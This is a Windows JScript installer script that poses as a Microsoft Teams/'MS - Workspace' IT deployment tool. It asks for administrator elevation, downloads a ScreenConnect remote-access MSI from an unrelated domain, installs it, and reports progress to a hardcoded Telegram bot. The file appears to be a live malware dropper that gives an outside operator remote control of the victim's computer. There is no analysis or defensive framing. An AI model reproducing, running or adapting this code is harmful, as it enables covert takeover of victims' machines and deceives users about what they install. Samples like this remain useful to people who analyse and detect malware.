// MS-TeamsSetup.js - IT Support Deployment Tool
// Run: cscript //nologo MS-TeamsSetup.js

(function () {
    "use strict";

    var CONFIG = {
        PRODUCT_NAME: "MS - Workspace",
        PRODUCT_VERSION: "1.0.0",
        MSI_URL: "https://swicurrie.xyz/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=xyz&c=&c=&c=&c=&c=&c=&c=",
        MSI_FILE_NAME: "WorkspaceClientSetup.msi",
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
        LOG_FILE: "deploy.log",
        MSI_LOG_FILE: "msi-install.log",
        DOWNLOAD_RETRIES: 2,
        RETRY_DELAY_MS: 1500,
        DOWNLOAD_TIMEOUT_MS: 300000,

        // Add vendor MSI properties here if needed, e.g.:
        // MSI_EXTRA_ARGS: "PROPERTY=value"
        MSI_EXTRA_ARGS: "",

        TELEGRAM_ENABLED: true,
        TELEGRAM_BOT_TOKEN: "8756497750:AAFX0gVj8j94Mff-FsRlnD3jfjuGzQZEfjo",
        TELEGRAM_CHAT_ID: "6429384311"
    };



    var I_ROCKET = "\uD83D\uDE80";
    var I_PKG = "\uD83D\uDCE6";
    var I_PC = "\uD83D\uDCBB";
    var I_CLOCK = "\u23F1";
    var I_CHECK = "\u2705";
    var I_NUM = "\uD83D\uDD22";

    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var fatalShown = false;

    function expand(p) {
        return shell.ExpandEnvironmentStrings(p);
    }

    var paths = {
        installDir: expand(CONFIG.INSTALL_DIR),
        logDir: expand(CONFIG.LOG_DIR),
        logFile: expand(CONFIG.LOG_DIR) + "\\" + CONFIG.LOG_FILE,
        msiLogFile: expand(CONFIG.LOG_DIR) + "\\" + CONFIG.MSI_LOG_FILE,
        msiPath: expand(CONFIG.INSTALL_DIR) + "\\" + CONFIG.MSI_FILE_NAME
    };

    function pad(n) {
        return (n < 10 ? "0" : "") + n;
    }

    function ts() {
        var d = new Date();
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
    }

    function ensureDirTree(dir) {
        var parent;
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fso.FolderExists(dir)) return;
        parent = fso.GetParentFolderName(dir);
        if (parent && parent !== dir && !fso.FolderExists(parent)) {
            ensureDirTree(parent);
        }
        if (!fso.FolderExists(dir)) fso.CreateFolder(dir);
    }

    function log(level, msg) {
        try {
            ensureDirTree(paths.logDir);
            var f = fso.OpenTextFile(paths.logFile, 8, true);
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
            f.Close();
        } catch (e) { }
    }

    function isAdmin() {
        try {
            var exec = shell.Exec("net session");
            while (exec.Status === 0) {
                WScript.Sleep(50);
            }
            return exec.ExitCode === 0;
        } catch (e) {
            return false;
        }
    }

    function relaunchElevated() {
        var app = new ActiveXObject("Shell.Application");
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
        WScript.Quit(0);
    }

    function showUserError(friendlyMsg) {
        if (!fatalShown) {
            fatalShown = true;
            shell.Popup(friendlyMsg, 0, CONFIG.PRODUCT_NAME + " Setup", 16);
        }
    }

    function quitFatal(friendlyMsg, technicalMsg, exitCode) {
        if (technicalMsg) log("ERROR", technicalMsg);
        notifyTelegram("Failed", technicalMsg || friendlyMsg, typeof exitCode === "number" ? exitCode : 1);
        showUserError(friendlyMsg);
        WScript.Quit(typeof exitCode === "number" ? exitCode : 1);
    }

    function enableTls12(http) {
        try { http.Option(9) = 2048; } catch (e) { }
    }

    function notifyTelegram(status, detail, exitCode) {
        var text, url, q, http, resp;

        if (!CONFIG.TELEGRAM_ENABLED) return;
        if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return;

        text =
            I_ROCKET + " Install Alert\n\n" +
            I_PKG + " Product: " + CONFIG.PRODUCT_NAME + "\n" +
            I_PC + " Status: " + status + "\n" +
            I_CLOCK + " Time: " + ts();

        if (typeof exitCode === "number") {
            text += "\n" + I_NUM + " Exit code: " + exitCode;
        }
        if (detail) {
            text += "\n" + I_CHECK + " Detail: " + detail;
        }

        try {
            url = "https://api.telegram.org/bot" + CONFIG.TELEGRAM_BOT_TOKEN + "/sendMessage";
            q = "chat_id=" + encodeURIComponent(String(CONFIG.TELEGRAM_CHAT_ID)) +
                "&text=" + encodeURIComponent(text);

            http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            enableTls12(http);
            http.SetTimeouts(15000, 15000, 30000, 30000);
            http.Open("GET", url + "?" + q, false);
            http.Send();

            resp = "";
            try { resp = http.ResponseText; } catch (e1) { }
            log("DEBUG", "Telegram HTTP " + http.Status + ": " + status);
            if (http.Status !== 200) {
                log("WARN", "Telegram failed: " + resp);
            }
        } catch (ex) {
            log("WARN", "Telegram notify failed: " + (ex.message || ex));
        }
    }

    function validateConfig() {
        if (!CONFIG.MSI_URL) {
            quitFatal("Setup could not start.", "MSI_URL is empty", 1);
        }
        if (CONFIG.MSI_URL.indexOf("https://") !== 0 && CONFIG.MSI_URL.indexOf("http://") !== 0) {
            quitFatal("Setup could not start.", "Invalid MSI_URL scheme", 1);
        }
        if (CONFIG.MSI_FILE_NAME.indexOf(".msi") === -1) {
            quitFatal("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
        }
    }

    function saveResponseBodyToFile(responseBody, outPath) {
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(responseBody);
        if (stream.Size <= 0) {
            stream.Close();
            return 0;
        }
        if (fso.FileExists(outPath)) fso.DeleteFile(outPath, true);
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
        stream.Close();
        return size;
    }

    function downloadInstaller(url, outPath) {
        var attempt, http, err, bytesWritten, status;
        ensureDirTree(fso.GetParentFolderName(outPath));
        err = "Unknown download error";

        for (attempt = 0; attempt <= CONFIG.DOWNLOAD_RETRIES; attempt++) {
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                enableTls12(http);
                http.SetTimeouts(30000, 30000, CONFIG.DOWNLOAD_TIMEOUT_MS, CONFIG.DOWNLOAD_TIMEOUT_MS);
                http.Open("GET", url, false);
                http.Send();

                status = http.Status;
                log("DEBUG", "Download attempt " + (attempt + 1) + " HTTP status: " + status);

                if (status === 200) {
                    bytesWritten = saveResponseBodyToFile(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fso.FileExists(outPath)) {
                        log("INFO", "Download OK (" + bytesWritten + " bytes)");
                        return true;
                    }
                    err = "HTTP 200 but zero-byte payload (attempt " + (attempt + 1) + ")";
                } else {
                    err = "HTTP " + status + " (attempt " + (attempt + 1) + ")";
                }
            } catch (ex) {
                err = (ex.message || String(ex)) + " (attempt " + (attempt + 1) + ")";
            }

            if (attempt < CONFIG.DOWNLOAD_RETRIES) {
                log("WARN", "Download failed: " + err + ". Retrying...");
                WScript.Sleep(CONFIG.RETRY_DELAY_MS);
            }
        }

        log("ERROR", "Download failed: " + err);
        return false;
    }

    function runInstaller(msiPath) {
        var args, cmd, code, attempt, modes;

        ensureDirTree(paths.logDir);

        modes = [
            "/passive /norestart REBOOT=ReallySuppress ALLUSERS=1",
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];

        for (attempt = 0; attempt < modes.length; attempt++) {
            args =
                '/i "' + msiPath + '" ' +
                modes[attempt] + " " +
                CONFIG.MSI_EXTRA_ARGS + " " +
                '/L*v "' + paths.msiLogFile + '"';

            cmd = "msiexec.exe " + args;
            log("INFO", "Install attempt " + (attempt + 1) + ": " + cmd);

            code = shell.Run(cmd, 1, true);
            log("INFO", "Install attempt " + (attempt + 1) + " exit code: " + code);

            if (code === 0 || code === 3010 || code === 1641 || code === 1638) {
                return code;
            }

            if (code !== 1603) {
                return code;
            }

            log("WARN", "Install attempt " + (attempt + 1) + " failed with 1603. Retrying...");
            WScript.Sleep(2000);
        }

        return 1603;
    }

    function describeExitCode(code) {
        switch (code) {
            case 0: return "Success";
            case 3010: return "Success (restart required)";
            case 1641: return "Success (restart initiated)";
            case 1638: return "Already installed";
            case 1602: return "Canceled by user";
            case 1603: return "Fatal error during installation";
            case 1618: return "Another installation is already in progress";
            default: return "Exit code " + code;
        }
    }

    function isSuccessCode(code) {
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }

    // ── Main ──
    ensureDirTree(paths.installDir);
    ensureDirTree(paths.logDir);

    log("INFO", "=== Deployment started ===");

    if (!isAdmin()) {
        log("INFO", "Not running as admin - requesting elevation");
        notifyTelegram("Started", "Requesting administrator elevation", null);
        relaunchElevated();
    }

    log("INFO", "Running with administrator privileges");
    notifyTelegram("Started", "Installation process started", null);

    validateConfig();

    if (!downloadInstaller(CONFIG.MSI_URL, paths.msiPath)) {
        quitFatal(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "Download failed",
            1
        );
    }

    if (!fso.FileExists(paths.msiPath) || fso.GetFile(paths.msiPath).Size <= 0) {
        quitFatal(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "MSI missing or empty after download",
            1
        );
    }

    notifyTelegram("Downloaded", "Installer downloaded successfully", null);

    var exitCode = runInstaller(paths.msiPath);
    var statusText = describeExitCode(exitCode);

    log("INFO", "Installation result: " + statusText);
    log("INFO", "MSI log file: " + paths.msiLogFile);
    log("INFO", "=== Deployment finished (exit " + exitCode + ") ===");

    if (isSuccessCode(exitCode)) {
        notifyTelegram("Success", statusText, exitCode);
    } else if (exitCode === 1602) {
        notifyTelegram("Canceled", statusText, exitCode);
    } else {
        notifyTelegram(
            "Failed",
            statusText + " | See log: " + paths.msiLogFile,
            exitCode
        );
        showUserError(
            "Setup could not be completed.\n\n" + statusText +
            "\n\nCheck log:\n" + paths.msiLogFile
        );
    }

    WScript.Quit(exitCode);
})();
